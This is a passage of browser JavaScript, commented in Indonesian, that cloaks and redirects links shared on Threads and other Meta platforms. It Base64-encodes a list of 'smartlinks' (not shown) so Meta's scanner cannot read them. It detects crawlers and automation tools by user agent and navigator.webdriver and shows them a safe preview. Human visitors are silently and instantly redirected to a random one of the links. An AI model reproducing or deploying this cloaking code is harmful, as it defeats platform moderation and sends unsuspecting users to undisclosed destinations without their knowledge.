        ];

        // Enkripsi otomatis ke Base64 di memori browser agar tidak terbaca scanner Meta
        const encodedLinks = rawSmartlinks.map(url => btoa(url));

        // =========================================================================
        // FILTER BOT CRAWLER THREADS/META (CLOAKING AGAR LINK TIDAK HILANG / BANNED)
        // =========================================================================
        function checkBot() {
            const ua = navigator.userAgent.toLowerCase();
            const botKeywords = [
                'facebookexternalhit', 'facebot', 'threads', 'meta-externalagent',
                'twitterbot', 'googlebot', 'bingbot', 'slurp', 'duckduckbot',
                'baiduspider', 'yandexbot', 'headlesschrome', 'phantomjs', 'selenium'
            ];
            for (let i = 0; i < botKeywords.length; i++) {
                if (ua.indexOf(botKeywords[i]) !== -1) return true;
            }
            return navigator.webdriver || false;
        }

        // =========================================================================
        // AUTO REDIRECT KILAT (INSTANT REDIRECT KETIKA DIKLIK MANUSIA)
        // =========================================================================
        (function fastExec() {
            // Jika yang membuka Bot Threads/Meta, tahan redirect agar preview gambar aman
            if (checkBot()) return;

            // Ambil secara acak 1 dari 8 Smartlink di atas
            const randomB64 = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
            const targetUrl = atob(randomB64);

            // Eksekusi redirect kilat seketika tanpa delay/tampilan
            window.location.replace(targetUrl);
        })();
